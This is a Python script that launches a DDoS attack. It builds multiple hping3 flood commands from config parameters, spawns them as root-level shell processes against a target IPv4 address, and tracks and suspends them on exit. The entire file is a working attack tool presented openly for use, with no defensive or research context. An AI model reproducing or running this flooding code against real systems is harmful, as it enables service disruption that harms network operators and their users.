import os
import subprocess
import signal
import time
import atexit
from config import Config

'''
Plz enter super user mode ("sudo su") to run this script.
'''


class bcolors:
    # https://stackoverflow.com/questions/287871/how-do-i-print-colored-text-to-the-terminal
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


class DDOS():
    def __init__(self, TARGETIPv4, parameters):
        self.startTime = time.time()
        self.responseTime = []
        self.PIDs = []
        self.ATKcommands = []
        self.TARGETIPv4 = TARGETIPv4
        self.ATKPARAMETERS = parameters

    def spawnATKprocess(self):
        for i, val in enumerate(self.ATKPARAMETERS):
            for j in range(val[3]):
                self.ATKcommands.append(
                    f'hping3 {val[0]} -d {val[1]} {val[2]} {self.TARGETIPv4} &')
        for i, val in enumerate(self.ATKcommands):
            proc = subprocess.Popen(val, shell=True)
            self.PIDs.append(proc.pid)
        # register signal handler
        signal.signal(signal.SIGINT, self.killATKprocess)
        # register exit handler
        atexit.register(self.killATKprocess)
        #
        self.length = len(self.PIDs)
        while True:
            time.sleep(1)

    def killATKprocess(self):
        print(f'{bcolors.OKGREEN}\nStop DDoS attack...{bcolors.ENDC}')
        for i, val in enumerate(self.PIDs):
            os.kill(val, signal.SIGSTOP)
        print(f'{bcolors.OKGREEN}Terminated {self.length} processes.{bcolors.ENDC}')
        print(
            f'{bcolors.OKGREEN}Total time: {int(time.time() - self.startTime)} seconds.{bcolors.ENDC}')


if __name__ == '__main__':
    config = Config()
    print(f'\n{bcolors.OKGREEN}Start DDoS attack to {config.ATKIPv4} with hping3.{bcolors.ENDC}\n')
    ddos = DDOS(config.ATKIPv4, config.ATKPARAMETERS)
    ddos.spawnATKprocess()
